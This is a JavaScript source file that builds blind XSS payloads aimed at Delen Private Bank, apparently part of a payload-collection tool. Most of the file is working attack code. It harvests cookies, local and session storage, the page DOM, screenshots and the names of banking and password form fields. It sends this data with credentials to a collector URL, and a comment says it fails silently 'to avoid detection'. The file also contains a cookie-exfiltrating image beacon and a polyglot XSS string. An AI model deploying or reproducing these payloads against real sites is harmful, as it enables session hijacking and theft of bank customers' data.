/**
 * Payload generation for Delen Private Bank Blind XSS detection
 * 
 * This module generates JavaScript payloads specifically designed for 
 * targeting financial institutions like Delen Private Bank.
 */

const config = require('../config.delen');

/**
 * Generate a payload script specifically for Delen Private Bank
 * @param {Object} config - Payload configuration
 * @returns {string} Generated payload script
 */
function generateDelenPayloadScript(config = {}) {
  // Merge with default configuration
  const payloadConfig = {
    ...require('../config.delen').payloads.defaultOptions,
    ...config
  };
  
  // Start building the payload
  let script = `
(function() {
  try {
    // Payload data collection
    var data = {};
    
    // Collect URL
    ${payloadConfig.collectUrl ? 'data.url = window.location.href;' : ''}
    
    // Collect IP (will be determined server-side)
    // IP collection happens on the server when the request is received
    
    // Collect User-Agent
    ${payloadConfig.collectUserAgent ? 'data.userAgent = navigator.userAgent;' : ''}
    
    // Collect Referrer
    ${payloadConfig.collectReferer ? 'data.referer = document.referrer;' : ''}
    
    // Collect Origin
    ${payloadConfig.collectOrigin ? 'data.origin = window.location.origin;' : ''}
    
    // Collect Cookies (non-HTTPOnly)
    ${payloadConfig.collectCookies ? `
    data.cookies = {};
    if (document.cookie) {
      var cookies = document.cookie.split(';');
      for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();
        var separatorIndex = cookie.indexOf('=');
        if (separatorIndex > -1) {
          var name = cookie.substring(0, separatorIndex);
          var value = cookie.substring(separatorIndex + 1);
          data.cookies[name] = value;
        }
      }
    }
    ` : ''}
    
    // Collect Local Storage
    ${payloadConfig.collectLocalStorage ? `
    data.localStorage = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      data.localStorage[key] = localStorage.getItem(key);
    }
    ` : ''}
    
    // Collect Session Storage
    ${payloadConfig.collectSessionStorage ? `
    data.sessionStorage = {};
    for (var i = 0; i < sessionStorage.length; i++) {
      var key = sessionStorage.key(i);
      data.sessionStorage[key] = sessionStorage.getItem(key);
    }
    ` : ''}
    
    // Collect DOM
    ${payloadConfig.collectDom ? 'data.dom = document.documentElement.outerHTML;' : ''}
    
    // Banking-specific data collection
    ${payloadConfig.collectBankingData ? `
    // Collect financial forms and sensitive data
    data.bankingData = collectBankingData();
    ` : ''}
    
    // Financial form collection
    ${payloadConfig.collectFinancialForms ? `
    data.financialForms = collectFinancialForms();
    ` : ''}
    
    // Take screenshot (simplified)
    ${payloadConfig.takeScreenshot ? `
    try {
      var canvas = document.createElement('canvas');
      var ctx = canvas.getContext('2d');
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
      data.screenshot = canvas.toDataURL('image/jpeg', 0.1);
    } catch (e) {
      // Screenshot failed, continue without it
    }
    ` : ''}
    
    // Send data to collector
    sendData(data);
  } catch (e) {
    // Silent fail to avoid detection
  }
  
  // Data sending function
  function sendData(data) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '${getCollectorUrl()}', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.withCredentials = true;
    xhr.send(JSON.stringify(data));
  }
  
  // Banking data collection function
  function collectBankingData() {
    var bankingData = {};
    
    // Look for common banking elements
    var accountInputs = document.querySelectorAll('input[name*="account"], input[name*="iban"], input[name*="bic"]');
    var amountInputs = document.querySelectorAll('input[name*="amount"], input[name*="value"]');
    var beneficiaryInputs = document.querySelectorAll('input[name*="beneficiary"], input[name*="recipient"]');
    
    bankingData.accountFields = accountInputs.length;
    bankingData.amountFields = amountInputs.length;
    bankingData.beneficiaryFields = beneficiaryInputs.length;
    
    // Check for sensitive text in page
    var pageText = document.body.innerText || document.body.textContent || '';
    var sensitiveKeywords = ['transfer', 'payment', 'transaction', 'balance', 'account', 'iban', 'bic', 'swift'];
    var sensitiveCount = 0;
    
    for (var i = 0; i < sensitiveKeywords.length; i++) {
      if (pageText.toLowerCase().indexOf(sensitiveKeywords[i]) !== -1) {
        sensitiveCount++;
      }
    }
    
    bankingData.sensitiveKeywords = sensitiveCount;
    
    return bankingData;
  }
  
  // Financial form collection function
  function collectFinancialForms() {
    var forms = document.querySelectorAll('form');
    var financialForms = [];
    
    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      var inputs = form.querySelectorAll('input, select, textarea');
      var formFields = [];
      
      for (var j = 0; j < inputs.length; j++) {
        var input = inputs[j];
        var fieldInfo = {
          type: input.type,
          name: input.name,
          id: input.id
        };
        
        // Check if this looks like a financial field
        if (input.name && (
          input.name.indexOf('account') !== -1 ||
          input.name.indexOf('iban') !== -1 ||
          input.name.indexOf('bic') !== -1 ||
          input.name.indexOf('swift') !== -1 ||
          input.name.indexOf('amount') !== -1 ||
          input.name.indexOf('value') !== -1 ||
          input.name.indexOf('currency') !== -1 ||
          input.name.indexOf('beneficiary') !== -1 ||
          input.name.indexOf('recipient') !== -1
        )) {
          fieldInfo.isFinancial = true;
        }
        
        formFields.push(fieldInfo);
      }
      
      if (formFields.length > 0) {
        financialForms.push({
          action: form.action,
          method: form.method,
          fields: formFields
        });
      }
    }
    
    return financialForms;
  }
})();
`;
  
  return script.trim();
}

/**
 * Get the collector URL for this payload
 * @returns {string} Collector URL
 */
function getCollectorUrl() {
  // In a real implementation, this would be dynamically generated
  // based on the deployment environment
  return 'http://localhost:3000/api/reports';
}

/**
 * Generate a simple payload for testing
 * @returns {string} Simple test payload
 */
function generateDelenTestPayload() {
  return `
<script>
  new Image().src = '${getCollectorUrl()}?test=1&cookie=' + escape(document.cookie);
</script>
`;
}

/**
 * Generate a polyglot payload (works in multiple contexts)
 * @returns {string} Polyglot payload
 */
function generateDelenPolyglotPayload() {
  // This is a simplified example - real polyglot payloads are much more complex
  return `
jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
`;
}

/**
 * Generate a banking-specific payload with advanced features
 * @returns {string} Banking-specific payload
 */
function generateBankingPayload() {
  return `
(function() {
  // Advanced banking payload with stealth features
  var data = {
    url: window.location.href,
    userAgent: navigator.userAgent,
    referer: document.referrer,
    origin: window.location.origin,
    timestamp: new Date().toISOString(),
    pageTitle: document.title
  };
  
  // Collect sensitive banking elements
  try {
    // Banking-specific selectors
    var selectors = [
      'input[name*="account"]',
      'input[name*="iban"]',
      'input[name*="bic"]',
      'input[name*="swift"]',
      'input[name*="amount"]',
      'input[name*="value"]',
      'input[name*="currency"]',
      'input[name*="beneficiary"]',
      'input[name*="recipient"]',
      'input[type="password"]',
      'input[type="email"]'
    ];
    
    data.sensitiveElements = [];
    for (var i = 0; i < selectors.length; i++) {
      var elements = document.querySelectorAll(selectors[i]);
      for (var j = 0; j < elements.length; j++) {
        data.sensitiveElements.push({
          selector: selectors[i],
          name: elements[j].name,
          id: elements[j].id,
          type: elements[j].type
        });
      }
    }
    
    // Check for transaction-related keywords in the page
    var pageContent = document.body.innerText || '';
    var transactionKeywords = ['transfer', 'payment', 'transaction', 'send', 'receive', 'deposit', 'withdraw'];
    data.transactionContext = false;
    
    for (var k = 0; k < transactionKeywords.length; k++) {
      if (pageContent.toLowerCase().indexOf(transactionKeywords[k]) !== -1) {
        data.transactionContext = true;
        break;
      }
    }
    
    // Send data
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '${getCollectorUrl()}', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.withCredentials = true;
    xhr.send(JSON.stringify(data));
  } catch (e) {
    // Silent fail
  }
})();
`;
}

module.exports = {
  generateDelenPayloadScript,
  generateDelenTestPayload,
  generateDelenPolyglotPayload,
  generateBankingPayload
};